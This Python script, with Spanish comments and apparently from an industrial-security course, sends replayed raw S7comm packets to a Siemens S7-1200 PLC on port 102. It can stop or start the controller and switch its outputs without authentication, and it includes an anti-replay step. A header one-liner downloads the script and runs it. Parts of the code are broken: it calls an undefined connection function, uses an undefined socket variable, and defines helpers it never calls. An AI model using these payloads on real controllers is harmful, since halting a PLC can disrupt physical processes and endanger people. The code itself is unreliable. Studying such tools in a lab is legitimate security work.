#!/usr/bin/env python3

# Pongo a disposición pública este script bajo el término de "software de dominio público".
# Puedes hacer lo que quieras con él porque es libre de verdad; no libre con condiciones como las licencias GNU y otras patrañas similares.
# Si se te llena la boca hablando de libertad entonces hazlo realmente libre.
# No tienes que aceptar ningún tipo de términos de uso o licencia para utilizarlo o modificarlo porque va sin CopyLeft.

# ----------
# Script de NiPeGun para interactuar con un PLC Siemens S7-1200, versión 1214c
#
# Ejecución remota (puede requerir permisos sudo):
#   wget -q -N --no-cache https://raw.githubusercontent.com/nipegun/Zubiri/refs/heads/main/CETI/SegInd/zubiri-test/play.py && python3 play.py [IPDelPLC]
#
# Bajar y editar directamente el archivo en nano:
#   curl -sL https://raw.githubusercontent.com/nipegun/Zubiri/refs/heads/main/CETI/SegInd/zubiri-test/play.py | nano -
# ----------

import curses
import time
import socket
import argparse
import sys
import io
import re
import textwrap

# Definir constantes para colores
cColorAzul='\033[0;34m'
cColorAzulClaro='\033[1;34m'
cColorVerde='\033[1;32m'
cColorRojo='\033[1;31m'
cFinColor='\033[0m' # Vuelve al color normal

def fDeterminarSiIPoFQDN(pHost):
  # Expresión regular para validar una dirección IP
  ip_regex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
  # Expresión regular para validar un FQDN
  fqdn_regex = r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*$"
  
  if re.match(ip_regex, pHost) or re.match(fqdn_regex, pHost):
    return True
  return False

def fMenu(stdscr, vHost):
  curses.curs_set(0)
  stdscr.keypad(True)
  curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_WHITE)

  menu = [
    "Encender PLC", "  Apagar PLC",
    "Encender salida %Q0.0",
    "  Apagar salida %Q0.0",
    "Encender salida %Q0.1",
    "  Apagar salida %Q0.1",
    "Encender salida %Q0.2",
    "  Apagar salida %Q0.2",
    "Encender salida %Q0.3",
    "  Apagar salida %Q0.3",
    "Encender salida %Q0.4",
    "  Apagar salida %Q0.4",
    "Encender salida %Q0.5",
    "  Apagar salida %Q0.5",
    "Encender salida %Q0.6",
    "  Apagar salida %Q0.6",
    "Encender salida %Q0.7",
    "  Apagar salida %Q0.7",
    "Encender salida %Q0.8",
    "  Apagar salida %Q0.8",
    "Encender salida %Q0.9",
    "  Apagar salida %Q0.9",
    "Salir"
  ]

  current_row = 0

  while True:
    stdscr.clear()
    height, width = stdscr.getmaxyx()

    for idx, row in enumerate(menu):
      x = width // 2 - len(row) // 2
      y = height // 2 - len(menu) // 2 + idx
      if idx == current_row:
        stdscr.attron(curses.color_pair(1))
        stdscr.addstr(y, x, row)
        stdscr.attroff(curses.color_pair(1))
      else:
        stdscr.addstr(y, x, row)

    stdscr.refresh()
    key = stdscr.getch()

    if key == curses.KEY_UP and current_row > 0:
      current_row -= 1
    elif key == curses.KEY_DOWN and current_row < len(menu) - 1:
      current_row += 1
    elif key == curses.KEY_HOME:
      current_row = 0
    elif key == curses.KEY_END:
      current_row = len(menu) - 1
    elif key == curses.KEY_PPAGE:
      current_row = max(0, current_row - 5)
    elif key == curses.KEY_NPAGE:
      current_row = min(len(menu) - 1, current_row + 5)
    elif key in [curses.KEY_ENTER, 10, 13]:
      if menu[current_row] == "Salir":
        break

      old_stdout = sys.stdout
      sys.stdout = io.StringIO()

      try:
        if menu[current_row] == "Encender PLC":
          fEncenderPLC(vHost)
        elif menu[current_row] == "  Apagar PLC":
          fApagarPLC(vHost)
        elif menu[current_row] == "Encender salida %Q0.0":
          fEncenderSalida(vHost, '%Q0.0', 'Salida %Q0.0')
        elif menu[current_row] == "  Apagar salida %Q0.0":
          fApagarSalida(vHost, '%Q0.0', 'Salida %Q0.0')
        elif menu[current_row] == "Encender salida %Q0.1":
          fEncenderSalida(vHost, '%Q0.1', 'Salida %Q0.1')
        elif menu[current_row] == "  Apagar salida %Q0.1":
          fApagarSalida(vHost, '%Q0.1', 'Salida %Q0.1')
        elif menu[current_row] == "Encender salida %Q0.2":
          fEncenderSalida(vHost, '%Q0.2', 'Salida %Q0.2')
        elif menu[current_row] == "  Apagar salida %Q0.2":
          fApagarSalida(vHost, '%Q0.2', 'Salida %Q0.2')
        elif menu[current_row] == "Encender salida %Q0.3":
          fEncenderSalida(vHost, '%Q0.3', 'Salida %Q0.3')
        elif menu[current_row] == "  Apagar salida %Q0.3":
          fApagarSalida(vHost, '%Q0.3', 'Salida %Q0.3')
        elif menu[current_row] == "Encender salida %Q0.4":
          fEncenderSalida(vHost, '%Q0.4', 'Salida %Q0.4')
        elif menu[current_row] == "  Apagar salida %Q0.4":
          fApagarSalida(vHost, '%Q0.4', 'Salida %Q0.4')
        elif menu[current_row] == "Encender salida %Q0.5":
          fEncenderSalida(vHost, '%Q0.5', 'Salida %Q0.5')
        elif menu[current_row] == "  Apagar salida %Q0.5":
          fApagarSalida(vHost, '%Q0.5', 'Salida %Q0.5')
        elif menu[current_row] == "Encender salida %Q0.6":
          fEncenderSalida(vHost, '%Q0.6', 'Salida %Q0.6')
        elif menu[current_row] == "  Apagar salida %Q0.6":
          fApagarSalida(vHost, '%Q0.6', 'Salida %Q0.6')
        elif menu[current_row] == "Encender salida %Q0.7":
          fEncenderSalida(vHost, '%Q0.7', 'Salida %Q0.7')
        elif menu[current_row] == "  Apagar salida %Q0.7":
          fApagarSalida(vHost, '%Q0.7', 'Salida %Q0.7')
        elif menu[current_row] == "Encender salida %Q0.8":
          fEncenderSalida(vHost, '%Q0.8', 'Salida %Q0.8')
        elif menu[current_row] == "  Apagar salida %Q0.8":
          fApagarSalida(vHost, '%Q0.8', 'Salida %Q0.8')
        elif menu[current_row] == "Encender salida %Q0.9":
          fEncenderSalida(vHost, '%Q0.9', 'Salida %Q0.9')
        elif menu[current_row] == "  Apagar salida %Q0.9":
          fApagarSalida(vHost, '%Q0.9', 'Salida %Q0.9')
      except Exception as e:
        print(f"Error: {e}")

      output_message = sys.stdout.getvalue()
      sys.stdout = old_stdout
      fImprimirSalida(stdscr, output_message)

  stdscr.clear()
  stdscr.addstr(0, 0, "Saliendo del programa...")
  stdscr.refresh()

def fImprimirSalida(stdscr, message):
  """Imprimir mensajes en una ventana centrada con word wrap si la línea es más larga que la ventana."""
  height, width = stdscr.getmaxyx()
  output_lines = message.strip().split("\n")

  # Ancho máximo del contenido (restando el borde)
  content_width = min(width - 4, 100)

  # Word wrap manual
  wrapped_lines = []
  for line in output_lines:
    wrapped = textwrap.wrap(line, width=content_width)
    wrapped_lines.extend(wrapped if wrapped else [""])

  # Altura de ventana
  output_win_height = min(len(wrapped_lines) + 4, height - 2)
  output_win_width = content_width + 4
  start_y = max(0, (height - output_win_height) // 2)
  start_x = max(0, (width - output_win_width) // 2)

  # Crear ventana
  output_win = curses.newwin(output_win_height, output_win_width, start_y, start_x)
  output_win.clear()
  output_win.border()

  # Mostrar líneas ajustadas
  visible_lines = wrapped_lines[-(output_win_height - 4):]
  for i, line in enumerate(visible_lines):
    output_win.addstr(i + 1, 2, line.ljust(content_width)[:content_width])

  output_win.addstr(output_win_height - 2, 2, "Presiona una tecla para continuar...")

  output_win.refresh()
  output_win.getch()
  output_win.clear()
  output_win.refresh()


# ---------- Payloads

# Primer payload de encendido o apagado del PLC: Solicitud de comunicación COTP
vPayloadSolComCOTP = '030000231ee00000006400c1020600c20f53494d415449432d524f4f542d4553c0010a'
vRespPayloadSolComCOTP = '030000231ed00064000b00c0010ac1020600c20f53494d415449432d524f4f542d4553'
# Segundo payload de encendido o apagado del PLC: Solicitud de comunicación S7comm
vPayloadSolComS7 = '030000ee02f080720100df31000004ca0000000100000120360000011d00040000000000a1000000d3821f0000a3816900151553657276657253657373696f6e5f31433943333846a38221001532302e302e302e303a305265616c74656b20555342204762452046616d696c7920436f6e74726f6c6c65722e54435049502e33a38228001500a38229001500a3822a0015194445534b544f502d494e414d4455385f313432323331343036a3822b000401a3822c001201c9c38fa3822d001500a1000000d3817f0000a38169001515537562736372697074696f6e436f6e7461696e6572a2a20000000072010000'
vRespPayloadSolComS7 = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'
# Tercer payload de encendido o apagado del PLC: Anti-replay
vPayloadAntiReplay = '0300008f02f08072020080310000054200000002000003b834000003b8010182320100170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f001500824000151a313b36455337203231342d31414533302d305842303b56322e328241000300030000000004e88969001200000000896a001300896b000400000000000072020000'
vRespPayloadAntiReplay = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'

# ----------

def fCalcularAntiReplay(pData):
  """ Extrae el challenge y calcula el valor anti-replay. """
  vChallenge = pData.hex()[48:50]  # Extrae el byte del challenge
  vPayloadAntiReplay = int(vChallenge, 16) + 0x80  # Suma 0x80
  return vPayloadAntiReplay


def fModificarPayload(pPayload, pAntiReplay):
  """ Modifica el payload con el valor anti-replay calculado. """
  vAntiHex = hex(pAntiReplay)[2:].zfill(2)  # Asegurar formato hexadecimal de 2 caracteres
  return pPayload[:46] + vAntiHex[0] + pPayload[47:48] + vAntiHex[1] + pPayload[48:]




def fEncenderPLC(pHost):

  # Cuarto payload: vPayloadEncender para encender el PLC
  vPayloadEncender = '0300004302f0807202003431000004f200000010000003ca3400000034019077000803000004e88969001200000000896a001300896b00040000000000000072020000'
  vRespPayloadEncender = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'

  try:
    vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vSocketConPLC.settimeout(2)
    vSocketConPLC.connect((pHost, 102))

    # 1. Enviar primer payload: vPayloadSolComCOTP
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
    print(f"Solicitud: {vPayloadSolComCOTP}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComCOTP:
      print("La respuesta a vPayloadSolComCOTP no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 2. Enviar segundo payload: vPayloadSolComS7
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
    print(f"Solicitud: {vPayloadSolComS7}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComS7}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComS7:
      print("La respuesta a vPayloadSolComS7 no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 3. Enviar tercer payload: vPayloadAntiReplay
    vSocketConPLC.send(bytearray.fromhex(vPayloadAntiReplay))
    print(f"Solicitud: {vPayloadAntiReplay}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print("No se recibió respuesta al enviar vPayloadAntiReplay")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadAntiReplay:
      print("La respuesta a vPayloadAntiReplay no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 4. Enviar cuarto payload: vPayloadEncender
    vSocketConPLC.send(bytearray.fromhex(vPayloadEncender))
    print(f"Solicitud: {vPayloadEncender}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadEncender}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadEncender:
      print("La respuesta a vPayloadEncender no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    print("\nPLC encendido correctamente!")
  except socket.timeout:
    print("Se agotó el tiempo de espera al comunicarse con el PLC")
  except Exception as e:
    print(f"Error al conectar o comunicarse con el PLC: {e}")
  finally:
    vSocketConPLC.close()


def fApagarPLC(pHost):

  # Cuarto payload: vPayloadApagar para apagar el PLC
  vPayloadApagar = '0300004302f0807202003431000004f200000010000003ca3400000034019077000801000004e88969001200000000896a001300896b00040000000000000072020000'
  vRespPayloadApagar = '0361f89bc8f607501810004f8800000300008902f0807201007a32000004ca0000000136110287248711a100000120821f0000a38169001500a3823200170000013a823b00048200823c00048140823d00048480c040823e00048480c040823f00151b313b36455337203231342d31414533302d30584230203b56322e328240001505323b37393482410003000300a20000000072010000'

  try:
    vSocketConPLC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vSocketConPLC.settimeout(2)
    vSocketConPLC.connect((pHost, 102))

    # 1. Enviar primer payload: vPayloadSolComCOTP
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComCOTP))
    print(f"Solicitud: {vPayloadSolComCOTP}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComCOTP}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComCOTP:
      print("La respuesta a vPayloadSolComCOTP no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 2. Enviar segundo payload: vPayloadSolComS7
    vSocketConPLC.send(bytearray.fromhex(vPayloadSolComS7))
    print(f"Solicitud: {vPayloadSolComS7}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadSolComS7}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadSolComS7:
      print("La respuesta a vPayloadSolComS7 no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 3. Enviar tercer payload: vPayloadAntiReplay
    vSocketConPLC.send(bytearray.fromhex(vPayloadAntiReplay))
    print(f"Solicitud: {vPayloadAntiReplay}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print("No se recibió respuesta al enviar vPayloadAntiReplay")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadAntiReplay:
      print("La respuesta a vPayloadAntiReplay no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    # 4. Enviar cuarto payload: vPayloadEncender
    vSocketConPLC.send(bytearray.fromhex(vPayloadApagar))
    print(f"Solicitud: {vPayloadApagar}")
    data = vSocketConPLC.recv(1024)
    if not data:
      print(f"No se recibió respuesta al enviar {vPayloadApagar}")
      vSocketConPLC.close()
      return
    data_hex = data.hex()
    print(f"Respuesta: {data_hex}")
    # Verificar que la respuesta sea la esperada
    if data_hex != vRespPayloadApagar:
      print("La respuesta a vPayloadApagar no es la esperada. Abortando.")
      vSocketConPLC.close()
      return

    print("\nPLC apagado correctamente!")
  except socket.timeout:
    print("Se agotó el tiempo de espera al comunicarse con el PLC")
  except Exception as e:
    print(f"Error al conectar o comunicarse con el PLC: {e}")
  finally:
    vSocketConPLC.close()






def fEnviarPayload(pData, pSocket):
  if pSocket is None:
    print("\n  Error: No hay conexión establecida.")
    return None
  try:
    pSocket.send(bytearray.fromhex(pData))
    vResp = pSocket.recv(1024)
    if vResp:
      print(f"\n  Respuesta del PLC: {vResp.hex()}\n")
    else:
      print("\n  No se recibió respuesta del PLC.\n")
    return vResp
  except socket.timeout:
    print("\n  Se esperó 5 segundos y el PLC no respondió.")
    return None








def fEncenderSalida(vHost, salida, nombre):
  vSocketConPLC = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP = '0300001611e00000cfc400c0010ac1020100c2020101'
  vSolCommS7 =   '0300001902f08032010000000000080000f0000008000803c0'
  cSalidas = {
    '%Q0.0':  '0300002502f08032010000001f000e00060501120a10010001000082000000000300010100',
    '%Q0.1':  '0300002502f08032010000001f000e00060501120a10010001000082000001000300010100',
    '%Q0.2':  '0300002502f08032010000001f000e00060501120a10010001000082000002000300010100',
    '%Q0.3':  '0300002502f08032010000001f000e00060501120a10010001000082000003000300010100',
    '%Q0.4':  '0300002502f08032010000001f000e00060501120a10010001000082000004000300010100',
    '%Q0.5':  '0300002502f08032010000001f000e00060501120a10010001000082000005000300010100',
    '%Q0.6':  '0300002502f08032010000001f000e00060501120a10010001000082000006000300010100',
    '%Q0.7':  '0300002502f08032010000001f000e00060501120a10010001000082000007000300010100',
    '%Q1.0':  '0300002502f08032010000001f000e00060501120a10010001000082000008000300010100',
    '%Q1.1':  '0300002502f08032010000001f000e00060501120a10010001000082000009000300010100'
  }

  if salida not in cSalidas:
    print(f"\n  Salida {nombre} no definida. \n")
    vSocketConPLC.close()
    return

  for cmd in [vSolCommCOTP, vSolCommS7, cSalidas[salida]]:
    fEnviarPayload(cmd, s)

  print(f"\n  Salida {nombre} activada correctamente. \n")
  vSocketConPLC.close()


def fApagarSalida(vHost, salida, nombre):
  vSocketConPLC = fConectar(vHost)
  if not s:
    return

  vSolCommCOTP = '0300001611e00000cfc400c0010ac1020100c2020101'
  vSolCommS7 = '0300001902f08032010000000000080000f0000008000803c0'
  comandos = {
    '%Q0.0':  '0300002502f08032010000001f000e00060501120a10010001000082000000000300010000',
    '%Q0.1':  '0300002502f08032010000001f000e00060501120a10010001000082000001000300010000',
    '%Q0.2':  '0300002502f08032010000001f000e00060501120a10010001000082000002000300010000',
    '%Q0.3':  '0300002502f08032010000001f000e00060501120a10010001000082000003000300010000',
    '%Q0.4':  '0300002502f08032010000001f000e00060501120a10010001000082000004000300010000',
    '%Q0.5':  '0300002502f08032010000001f000e00060501120a10010001000082000005000300010000',
    '%Q0.6':  '0300002502f08032010000001f000e00060501120a10010001000082000006000300010000',
    '%Q0.7':  '0300002502f08032010000001f000e00060501120a10010001000082000007000300010000',
    '%Q0.8':  '0300002502f08032010000001f000e00060501120a10010001000082000008000300010000',
    '%Q0.9':  '0300002502f08032010000001f000e00060501120a10010001000082000009000300010000',
  }

  if salida not in comandos:
    print(f"\n  Salida {nombre} no definida. \n")
    vSocketConPLC.close()
    return

  for cmd in [vSolCommCOTP, vSolCommS7, comandos[salida]]:
    fEnviarPayload(cmd, s)

  print(f"\n  Salida {nombre} desactivada correctamente. \n")
  vSocketConPLC.close()




if __name__ == "__main__":
  if len(sys.argv) > 1:
    vHost = sys.argv[1]
    if not fDeterminarSiIPoFQDN(vHost):
      print(cColorRojo + "\n  La dirección proporcionada no es una IP válida ni un FQDN.\n" + cFinColor)
      sys.exit(1)
    curses.wrapper(lambda stdscr: fMenu(stdscr, vHost))
  else:
    print(cColorRojo + "\n  No has indicado cual es la IP del PLC.\n" + cFinColor)
    print("  Uso correcto: python3 [RutaAlScript.py] [IPDelPLC] \n")
